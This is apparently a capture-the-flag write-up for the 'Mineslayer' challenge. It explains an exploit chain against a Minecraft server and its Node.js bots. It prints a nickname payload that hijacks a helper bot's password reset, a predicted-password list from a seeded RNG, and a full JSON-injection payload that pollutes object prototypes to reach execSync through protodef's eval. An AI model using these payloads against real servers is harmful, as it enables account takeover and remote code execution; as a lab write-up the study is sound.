---
tags:
  - midnightctf
  - web
  - misc
  - pwn
---

# Mineslayer

**Flags:**

```text
FLAG_1: MCTF{M1ni_M3ssage_N3st1ng_g0es_H4rd}
FLAG_1 (revenge): MCTF{W1ll_Y0u_F1nd_4n0th3r_Byp4ss??}
FLAG_2: MCTF{Th4ts_4_sh1t_t0n_0f_g4dg3t}
```

## Why this was really one chain

I had originally treated Mineslayer as two writeups, but the challenge makes more sense as one continuous chain:

1. abuse the helper bot to force a password reset on `Administrator`
2. predict the new admin password
3. log in as the re-op'd admin account
4. use `/bot` as a JSON injection sink
5. turn that into prototype pollution inside the Node bot process
6. reach a code-generation path that executes `/getflag`

The first flag was the proof that the helper-bot side was exploitable. The second flag was the real finish.

## Architecture

```text
+-------------------+       +-------------------+
|   Paper Server    |       |   Admin Bot       |
|   (Java, 1.21.8)  |<----->|   (Node.js)       |
|                   |       |   username:       |
|  Plugins:         |       |   Administrator   |
|  - Mineslayer     |       +-------------------+
|  - SimpleNicks    |
|  - AuthMe         |       +-------------------+
|  - LuckPerms      |       |  Mineslayer Bot   |
|                   |       |  (Node.js)        |
|  /getflag (SUID)  |       |  spawned by /bot  |
|  /root/flag.txt   |       +-------------------+
+-------------------+
```

The important moving parts were:

- the nickname filter in the Paper plugin
- the helper bot that watches chat for URLs
- the deterministic password reset logic
- the admin-only `/bot` command
- the Node bot's unsafe recursive merge
- the protocol compiler behind mineflayer / protodef

## Part 1: Taking over `Administrator`

### Why `/renew` mattered

The command that made the whole challenge crack open was `/renew`. Once I read the server-side logic, the real goal was obvious:

```java
String newPassword = PasswordUtil.generate(16);
authMeApi.changePassword(username, newPassword);

Player target = Bukkit.getPlayerExact(username);
if (target != null && target.isOnline()) {
    target.kick(
        Component.text("You've been flagged as a bot user.\n\n", NamedTextColor.RED)
            .append(Component.text("Please login again using this password:\n\n", NamedTextColor.GRAY))
            .append(Component.text(newPassword, NamedTextColor.WHITE)));
}
```

If I could make a privileged actor run:

```text
/renew Administrator
```

then three things happened at once:

1. the real admin password was rotated
2. the real admin session was kicked
3. I got a fresh password target to predict

That was enough because the plugin also auto-opped the `Administrator` account on login.

### Payload 1: `x<c:Administrator>`

The core trick for `FLAG_1` was:

```text
x<c:Administrator>
```

This payload worked because three different pieces of the system interpreted it differently.

#### 1. Why the Mineslayer nick filter allowed it

The nick filter only stripped a narrow list of MiniMessage tags:

```java
private static final MiniMessage UNSAFE_TAG_STRIPPER = MiniMessage.builder()
    .tags(TagResolver.builder()
        .resolvers(
            StandardTags.translatable(),
            StandardTags.clickEvent(),
            StandardTags.hoverEvent(),
            StandardTags.insertion(),
            StandardTags.font(),
            StandardTags.selector(),
            StandardTags.keybind(),
            StandardTags.score(),
            StandardTags.nbt(),
            StandardTags.newline()
        )
        .build())
    .build();
```

Color tags were not in that list. So:

```java
stripTags("x<c:Administrator>")
```

returned the original string unchanged, which meant the filter saw nothing dangerous and let the nick through.

#### 2. Why SimpleNicks still accepted it

The second layer was the nickname plugin itself. It did a fuller MiniMessage parse than the Mineslayer filter.

For SimpleNicks, `<c:Administrator>` was interpreted as a color tag, which consumed `Administrator` as the tag parameter instead of preserving it as plain text. After normalization, the visible plain-text nick became just:

```text
x
```

That was the crucial mismatch:

- the Mineslayer filter saw the raw input and let it through
- SimpleNicks normalized it to plain text that no longer collided with `Administrator`

So the nickname was accepted even though it still carried formatting semantics.

#### 3. Why the helper bot renewed the real admin

The helper bot watched for URLs in chat:

```javascript
const urlRegex = /(https?:\/\/[^\s]+)/i
let targetUsername = ''

bot.on('chat', (username, message) => {
  if (urlRegex.test(message)) {
    targetUsername = username
    bot.chat(`/nick who ${username}`)
    setTimeout(() => {
      bot.chat(`/renew ${targetUsername}`)
    }, 300)
  }
})
```

Once my formatted nickname posted a URL, the bot's parser did not agree with the previous layers about what the sender's name was. The rendered chat content surfaced `Administrator` strongly enough that mineflayer treated the message as if it came from that account.

So the sequence became:

1. set nick to `x<c:Administrator>`
2. send any URL in chat
3. helper bot treats the sender as `Administrator`
4. helper bot runs `/renew Administrator`

That kicked the real admin and rotated the password.

### Why password prediction worked

At first the new admin password looked like a brute-force problem. It was not.

The generator was:

```java
private static Random getRandom() {
    if (random == null) {
        long seed = Bukkit.getWorld("world").getSeed();
        random = new Random(seed);
    }
    return random;
}
```

This is just `java.util.Random` seeded from the world seed. Once the world seed was known, every future password was fixed.

That meant `/renew Administrator` did not produce an unknown secret. It produced "the next value in a deterministic sequence."

The first few candidates were:

```javascript
const predicted = [
  '1HryYNeloPBLeWyY',
  'T4sPU4pqZH_hR9iu',
  'LLlAlGhSph1AU0Dk',
  'ZTLVc839AyI_qjcJ',
  'MrMFEGGNUMzp3fhS'
]
```

After the helper bot kicked the real admin, I just logged in as `Administrator` and walked the sequence until one worked.

### Result of part 1

Once the login succeeded, the plugin re-granted operator privileges automatically and `/flag` gave me `FLAG_1`.

That was already a strong exploit chain, but it also unlocked the real attack surface:

```text
/bot <commands>
```

## Part 2: Turning `/bot` into RCE

### Why `FLAG_2` needed a different primitive

The visible `/flag` command only printed the easy flag:

```java
sender.sendMessage(MM.deserialize("[<yellow>FLAG_1</yellow>]: <bold>" + this.flag + "</bold>"));
```

The real target was `/getflag`, a SUID helper that read `/root/flag.txt`. So the real problem was:

> get code execution in a process that can run `/getflag`, then get the output back out

The plugin itself handed me both pieces:

- `/bot` let me start a fresh Node process with attacker-controlled config
- bot stdout was streamed back into chat by the plugin

### Why `/bot` was a JSON injection sink

The Java side built the config like this:

```java
String[] commands = input.split(";");
List<String> cmdList = new ArrayList<>();
for (String cmd : commands) {
    String trimmed = cmd.trim();
    if (!trimmed.isEmpty()) cmdList.add(trimmed);
}

StringBuilder jsonArray = new StringBuilder("[");
for (int i = 0; i < cmdList.size(); i++) {
    if (i > 0) jsonArray.append(",");
    jsonArray.append("\"").append(cmdList.get(i)).append("\"");
}
jsonArray.append("]");
```

The bug is simple: commands are wrapped in quotes, but quote characters inside the command are not escaped.

So a single "command" could close the `commands` array early and inject new top-level JSON keys.

That is why payloads of the form:

```text
a"],"__proto__":{...},"x":["b
```

work at all.

The `a` and `b` are just fillers that keep the final JSON valid:

- `a` becomes the harmless first element of `commands`
- `b` becomes the harmless first element of a fake trailing array used to repair the syntax

### What the injected config looked like

The final payload I used produced a config structurally equivalent to:

```json
{
  "host": "localhost",
  "port": 25565,
  "username": "mineslayer-beta",
  "commands": ["a"],
  "__proto__": {
    "0": "(console.log(require('child_process').execSync('/getflag',{encoding:'utf8'})),0)"
  },
  "username": {
    "constructor": {
      "prototype": {
        "minecraftVersion": "1.0.0",
        "majorVersion": "1.0",
        "name": "_",
        "type": "varint"
      }
    }
  },
  "version": "1.21.8",
  "x": ["b"]
}
```

Two details matter here:

1. duplicate JSON keys are allowed by `JSON.parse`, and the later one wins
2. the later `username` key is intentional, because the merge bug becomes useful only when the target already has a string `username`

### Why the Node merge made prototype pollution reachable

The bot process loaded the JSON and merged it like this:

```javascript
function merge(target, source) {
    for (let key of Object.keys(source)) {
        typeof target[key] !== "undefined" && typeof source[key] === "object"
            ? target[key] = merge(target[key], source[key])
            : target[key] = source[key]
    }
    return target
}

const customConfig = JSON.parse(fs.readFileSync(path.resolve(configPath), 'utf8'))
const defaultConf = { host: 'localhost', username: 'mineslayer-beta', port: 25565 }
const config = merge(defaultConf, customConfig)
```

This is exploitable in two different ways:

- `__proto__` lets me recurse into `Object.prototype`
- `username.constructor.prototype` lets me recurse into `String.prototype`, because the default target value for `username` is already a string

That second point is why the working payload used `username` and not just some random nested object.

## The final `/bot` payload

The payload that actually worked was:

```text
/bot a"],"__proto__":{"0":"(console.log(require('child_process').execSync('/getflag',{encoding:'utf8'})),0)"},"username":{"constructor":{"prototype":{"minecraftVersion":"1.0.0","majorVersion":"1.0","name":"_","type":"varint"}}},"version":"1.21.8","x":["b
```

This looks ugly, but each piece has a precise job.

### Why `"__proto__":{"0":"(...)"}` matters

This part:

```json
"__proto__":{"0":"(console.log(require('child_process').execSync('/getflag',{encoding:'utf8'})),0)"}
```

pollutes:

```javascript
Object.prototype["0"]
```

That sounds useless until you look at the protocol compiler. Deep in protodef / mineflayer, protocol field arrays are iterated with `for...in`.

That means inherited enumerable properties on `Object.prototype` are treated like real array entries.

So by setting:

```javascript
Object.prototype["0"] = "(console.log(...),0)"
```

I made protocol arrays appear to have an extra element at index `0`.

The expression string itself is also carefully shaped:

- `require('child_process').execSync('/getflag', { encoding: 'utf8' })` runs the SUID helper and captures the flag as text
- `console.log(...)` pushes that flag to stdout
- `,0` makes the whole expression evaluate to a harmless numeric value after the side effect, which keeps the generated code syntactically acceptable in an expression context

### Why the `username.constructor.prototype` pollution is also required

A raw string in `Object.prototype["0"]` is not enough. The compiler does not just iterate array elements - it expects them to behave like descriptor objects with fields such as `type` and `name`.

That is why this second payload block exists:

```json
"username":{"constructor":{"prototype":{"minecraftVersion":"1.0.0","majorVersion":"1.0","name":"_","type":"varint"}}}
```

Because the target `username` is already a string, the recursive merge walks:

```text
defaultConf.username -> String constructor -> String.prototype
```

and pollutes `String.prototype`.

That gives every string, including the fake string stored in `Object.prototype["0"]`, the extra properties the compiler expects.

Those fields are not random:

- `type: "varint"` gives the fake descriptor a valid-looking protocol type
- `name: "_"` gives the compiler a safe identifier to emit
- `minecraftVersion` and `majorVersion` provide enough shape for the polluted value to survive the protocol-selection path

Without this `String.prototype` scaffolding, the fake element crashes too early and never reaches the interesting code-generation point.

### Why `"version":"1.21.8"` is present

This part:

```json
"version":"1.21.8"
```

forces a concrete protocol version. That stabilizes the mineflayer / minecraft-data path and ensures the process reaches the compiler with a consistent protocol definition instead of wandering through a different negotiation path.

In practice, this made the payload reliable enough to hit the right compiler logic.

### Why `"x":["b"` is needed

This is just syntax repair.

The command is being injected into a place where the Java code is still going to append the closing quote and bracket from its own serializer. The fake trailing array consumes those characters cleanly so the resulting JSON still parses.

Without the `x` tail, the payload breaks the document but does not produce a usable config.

## Why code generation was the winning gadget

The last crucial step was understanding where polluted data actually becomes execution.

The mineflayer stack eventually reaches protodef, which compiles generated JavaScript:

```javascript
compile (code) {
  const native = this.native
  const { PartialReadError } = require('./utils')
  return eval(code)()
}
```

That is the actual exploit boundary.

The point of the whole `/bot` payload is not "prototype pollution is bad" in the abstract. The point is:

1. inject top-level JSON
2. pollute `Object.prototype` so arrays pick up a fake element
3. pollute `String.prototype` so that fake element looks valid enough
4. survive protocol shaping long enough to reach protodef
5. get my expression emitted into generated code
6. let `eval(code)()` execute it

At that point `console.log(execSync('/getflag'))` runs inside the Node bot, and the plugin faithfully relays the stdout line back into Minecraft chat.

## End-to-end chain

1. Register a normal player.
2. Set the nickname to `x<c:Administrator>`.
3. Send a URL in chat so the helper bot renews `Administrator`.
4. Predict the next admin password from the seeded Java RNG.
5. Log in as `Administrator` and regain operator access.
6. Send the `/bot` JSON-injection payload.
7. Pollute `Object.prototype` and `String.prototype`.
8. Reach protodef's code generator and execute `/getflag`.
9. Read `FLAG_2` from the bot's stdout in chat.

## Final result

```text
FLAG_1: MCTF{M1ni_M3ssage_N3st1ng_g0es_H4rd}
FLAG_2: MCTF{Th4ts_4_sh1t_t0n_0f_g4dg3t}
```

## Takeaways

- Partial rich-text filtering is not safe when later components parse the same input differently.
- Deterministic password generation turns password reset into account takeover.
- JSON injection plus recursive merge is enough to make prototype pollution practical.
- Prototype pollution gets dramatically worse once polluted values reach a code generator or an `eval` path.
